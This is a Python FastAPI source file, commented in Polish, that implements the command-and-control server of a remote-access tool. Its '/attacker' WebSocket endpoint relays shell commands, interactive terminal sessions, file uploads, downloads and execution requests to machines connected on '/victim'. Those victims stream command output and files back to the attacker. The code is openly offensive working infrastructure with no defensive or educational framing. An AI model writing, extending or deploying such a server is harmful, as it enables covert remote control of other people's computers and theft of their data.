import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.responses import PlainTextResponse

# Przechowujemy połączenia wg roli: "attacker" i "victim"
victims: dict[str, WebSocket] = {}
attacker_ws: WebSocket | None = None

app = FastAPI()


@app.get("/")
async def health():
    """Odpowiada na healthchecki Rendera (HEAD/GET /)."""
    return PlainTextResponse("ok")


async def notify_attacker(message_dict: dict):
    """Wysyła JSON do attackera jeśli jest podłączony."""
    global attacker_ws
    if attacker_ws is not None:
        try:
            await attacker_ws.send_text(json.dumps(message_dict))
        except Exception:
            pass


@app.websocket("/attacker")
async def attacker_endpoint(ws: WebSocket):
    """WebSocket endpoint dla attackera (/attacker)."""
    global attacker_ws
    await ws.accept()
    attacker_ws = ws
    print("[+] Attacker połączony")

    # Wyślij listę aktywnych victimów
    await ws.send_text(json.dumps({
        "type": "victims_list",
        "victims": list(victims.keys())
    }))

    try:
        while True:
            msg = await ws.receive()

            if msg["type"] == "websocket.receive":
                if "text" in msg:
                    try:
                        data = json.loads(msg["text"])
                    except json.JSONDecodeError:
                        await ws.send_text(json.dumps({"type": "error", "msg": "Nieprawidłowy JSON"}))
                        continue

                    target = data.get("target")
                    victim = victims.get(target)

                    if not victim:
                        await ws.send_text(json.dumps({
                            "type": "error",
                            "msg": f"Victim '{target}' nie jest podłączony"
                        }))
                        continue

                    cmd = data.get("cmd")

                    if cmd == "shell":
                        await victim.send_text(json.dumps({
                            "type": "shell",
                            "command": data.get("command", "")
                        }))

                    elif cmd == "upload":
                        await victim.send_text(json.dumps({
                            "type": "upload",
                            "filename": data.get("filename", "file.bin")
                        }))

                    elif cmd == "download":
                        await victim.send_text(json.dumps({
                            "type": "download",
                            "filepath": data.get("filepath", "")
                        }))

                    elif cmd == "execute":
                        await victim.send_text(json.dumps({
                            "type": "execute",
                            "filepath": data.get("filepath", "")
                        }))

                    elif cmd == "terminal_start":
                        await victim.send_text(json.dumps({"type": "terminal_start"}))

                    elif cmd == "terminal_input":
                        await victim.send_text(json.dumps({
                            "type": "terminal_input",
                            "input": data.get("input", "")
                        }))

                    elif cmd == "terminal_stop":
                        await victim.send_text(json.dumps({"type": "terminal_stop"}))

                    elif cmd == "terminal_resize":
                        await victim.send_text(json.dumps({
                            "type": "terminal_resize",
                            "rows": data.get("rows", 24),
                            "cols": data.get("cols", 80)
                        }))

                    else:
                        await ws.send_text(json.dumps({"type": "error", "msg": f"Nieznane polecenie: {cmd}"}))

                elif "bytes" in msg:
                    # Attacker wysyła plik binarnie — przekaż do victimów
                    for vid, v in victims.items():
                        try:
                            await v.send_bytes(msg["bytes"])
                        except Exception:
                            pass

            elif msg["type"] == "websocket.disconnect":
                break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[!] Błąd attacker: {e}")
    finally:
        attacker_ws = None
        print("[-] Attacker rozłączony")


@app.websocket("/victim")
async def victim_endpoint(ws: WebSocket, victim_id_query: str | None = Query(default=None, alias="id")):
    """WebSocket endpoint dla victima (/victim?id=...)."""
    await ws.accept()

    victim_id = victim_id_query or f"victim-{id(ws)}"

    # Jeśli victim o tym samym ID już istnieje — najpierw nadpisz, potem zamknij starą
    old_ws = victims.get(victim_id)
    victims[victim_id] = ws  # NAJPIERW nadpisz — żeby stary finally nie usunął nowego

    if old_ws is not None:
        try:
            await old_ws.close()
        except Exception:
            pass
    print(f"[+] Victim połączony: {victim_id} (aktywnych: {len(victims)})")

    await notify_attacker({"type": "victim_connected", "id": victim_id})

    try:
        while True:
            msg = await ws.receive()

            if msg["type"] == "websocket.receive":
                if "text" in msg:
                    # Victim odsyła wyniki — przekaż do attackera
                    try:
                        data = json.loads(msg["text"])
                        data["from"] = victim_id
                        await notify_attacker(data)
                    except json.JSONDecodeError:
                        await notify_attacker({"type": "raw", "from": victim_id, "data": msg["text"]})

                elif "bytes" in msg:
                    # Victim odsyła plik binarnie — przekaż do attackera
                    if attacker_ws:
                        await notify_attacker({
                            "type": "file_incoming",
                            "from": victim_id,
                            "size": len(msg["bytes"])
                        })
                        await attacker_ws.send_bytes(msg["bytes"])

            elif msg["type"] == "websocket.disconnect":
                break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[!] Błąd victim {victim_id}: {e}")
    finally:
        # Usuń victima TYLKO jeśli to nadal NASZA sesja (nie nadpisana przez reconnect)
        if victims.get(victim_id) is ws:
            victims.pop(victim_id, None)
            print(f"[-] Victim rozłączony: {victim_id} (aktywnych: {len(victims)})")
            await notify_attacker({"type": "victim_disconnected", "id": victim_id})
        else:
            print(f"[-] Stara sesja victima {victim_id} zamknięta (nowa już istnieje)")
